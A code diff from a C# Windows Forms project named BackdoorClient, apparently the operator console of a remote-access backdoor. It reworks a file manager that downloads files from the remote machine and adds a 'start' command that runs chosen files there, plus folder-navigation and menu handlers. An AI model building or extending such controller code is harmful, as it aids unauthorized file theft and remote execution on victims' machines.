@@ -73,43 +73,68 @@ namespace BackdoorClient
         {
             try
             {
-                /*
-                XmlDocument doc = new XmlDocument();
-                string docContent = mainForm.SendCommandAndGetResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}", 100000);
-                if (docContent == "Не получилось скачать файл") return;
-
-                var bytesForWrite = new byte[1000];
-                var fname = "";
-
-                doc.LoadXml(docContent);
-
-                XmlNode root = doc.FirstChild;
-
-                if (root.HasChildNodes)
-                {
-                    for (int i = 0; i < root.ChildNodes.Count; i++)
-                    {
-                        if (root.ChildNodes[i].Name == "fname")
-                        {
-                            fname = root.ChildNodes[i].InnerText;
-                            break;
-                        }
-                    }
-                    for (int i = 0; i < root.ChildNodes.Count; i++)
-                    {
-                        if (root.ChildNodes[i].Name == "bytesArr")
-                        {
-                            bytesForWrite = Encoding.UTF8.GetBytes(root.ChildNodes[i].InnerText);
-                        }
-                    }
-                }
-                */
-                System.IO.File.WriteAllBytes(filesView.SelectedNode.Text.Remove(0, 1), mainForm.SendCommandAndGetBytesResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}", 10000000));
+                System.IO.File.WriteAllBytes(filesView.SelectedNode.Text, mainForm.SendCommandAndGetBytesResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}"));
             }
-            catch
+            catch(Exception er)
             {
-
+                MessageBox.Show($"Error in download file {er.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private void RefreshtoolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            RefreshFileMgr();
+        }
+
+        private void goToFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            pathTextBox.Text = pathTextBox.Text + filesView.SelectedNode.Text;
+            RefreshFileMgr();
+        }
+
+        private void goToParentFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (pathTextBox.Text == "/" || pathTextBox.Text.EndsWith("/")) return;
+            for (int i = pathTextBox.Text.Length - 1; i > 0; i--)
+            {
+                if (pathTextBox.Text[i] == '/')
+                {
+                    pathTextBox.Text = pathTextBox.Text.Remove(i, pathTextBox.Text.Length - i);
+                    break;
+                }
+            }
+
+            RefreshFileMgr();
+        }
+
+        private void fileManagmentMenu_Opening(object sender, CancelEventArgs e)
+        {
+            if (filesView.SelectedNode == null)
+            {
+                for (int i = 0; i < fileManagmentMenu.Items.Count; i++)
+                {
+                    if (i == 2)
+                    {
+                        fileManagmentMenu.Items[i].Enabled = true; continue;
+                    }
+                    fileManagmentMenu.Items[i].Enabled = false;
+                }
+                return;
+            }
+            else
+            {
+                for (int i = 0; i < fileManagmentMenu.Items.Count; i++) fileManagmentMenu.Items[i].Enabled = true;
+            }
+            if (!filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[1].Enabled = false; else fileManagmentMenu.Items[1].Enabled = true;
+            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[3].Enabled = false; else fileManagmentMenu.Items[3].Enabled = true;
+            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[4].Enabled = false; else fileManagmentMenu.Items[4].Enabled = true;
+            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[5].Enabled = false; else fileManagmentMenu.Items[5].Enabled = true;
+        }
+
+        private void startToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string s = $"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}";
+            resulteText.Text = mainForm.SendCommandAndGetResponce(s);//$"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}");
         }
     }
 }
